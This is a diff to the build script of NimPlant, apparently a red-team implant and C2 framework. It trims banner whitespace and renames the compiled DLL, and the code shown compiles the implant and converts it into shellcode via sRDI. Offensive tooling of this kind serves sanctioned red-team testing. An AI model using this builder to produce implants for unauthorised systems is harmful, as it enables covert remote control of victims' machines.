@@ -20,28 +20,28 @@ from client.dist.srdi.ShellcodeRDI import *
 def print_banner():
     print(
         r"""
-                  *    *(#    #             
-                  **  **(##  ##             
-         ########       (       ********    
-        ####(###########************,****   
-           # ########       ******** *      
-           .###                   ***       
-           .########         ********       
-           ####    ###     ***    ****      
-         ######### ###     *** *********    
-       #######  ####  ## **  ****  *******  
-       #####    ##      *      **    *****  
-       ######  ####   ##***   **** .******  
-       ###############     ***************  
-            ##########     **********       
-               #########**********          
-                 #######********           
-     _   _ _           ____  _             _   
-    | \ | (_)_ __ ___ |  _ \| | __ _ _ __ | |_ 
+                  *    *(#    #
+                  **  **(##  ##
+         ########       (       ********
+        ####(###########************,****
+           # ########       ******** *
+           .###                   ***
+           .########         ********
+           ####    ###     ***    ****
+         ######### ###     *** *********
+       #######  ####  ## **  ****  *******
+       #####    ##      *      **    *****
+       ######  ####   ##***   **** .******
+       ###############     ***************
+            ##########     **********
+               #########**********
+                 #######********
+     _   _ _           ____  _             _
+    | \ | (_)_ __ ___ |  _ \| | __ _ _ __ | |_
     |  \| | | '_ ` _ \| |_) | |/ _` | '_ \| __|
-    | |\  | | | | | | |  __/| | (_| | | | | |_ 
-    |_| \_|_|_| |_| |_|_|   |_|\__,_|_| |_|\__|                                  
-                                                                                                  
+    | |\  | | | | | | |  __/| | (_| | | | | |_
+    |_| \_|_|_| |_| |_|_|   |_|\__,_|_| |_|\__|
+
         A light-weight stage 1 implant and C2 written in Nim and Python
         By Cas van Cooten (@chvancooten)
     """
@@ -163,7 +163,7 @@ def compile_nim(binary_type, xor_key, debug=False):
         if binary_type == "dll":
             compile_command = (
                 compile_command
-                + " -o:client/bin/NimPlant.dll --app=lib --nomain -d:exportDll --passL:-Wl,--dynamicbase --gc:orc"
+                + " -o:client/bin/SomePlant.dll --app=lib --nomain -d:exportDll --passL:-Wl,--dynamicbase --gc:orc"
             )
 
         if sleep_mask_enabled:
@@ -178,18 +178,18 @@ def compile_nim(binary_type, xor_key, debug=False):
         os.system(compile_command)
 
     elif binary_type == "raw":
-        if not os.path.isfile("client/bin/NimPlant.dll"):
+        if not os.path.isfile("client/bin/SomePlant.dll"):
             compile_nim("dll", xor_key)
         else:
             # Compile a new DLL NimPlant if no recent version exists
-            file_mod_time = os.stat("client/bin/NimPlant.dll").st_mtime
+            file_mod_time = os.stat("client/bin/SomePlant.dll").st_mtime
             last_time = (time.time() - file_mod_time) / 60
 
             if not last_time < 5:
                 compile_nim("dll", xor_key)
 
         # Convert DLL to PIC using sRDI
-        dll = open("client/bin/NimPlant.dll", "rb").read()
+        dll = open("client/bin/SomePlant.dll", "rb").read()
         shellcode = ConvertToShellcode(dll, HashFunctionName("Update"), flags=0x4)
         with open("client/bin/NimPlant.bin", "wb") as f:
             f.write(shellcode)
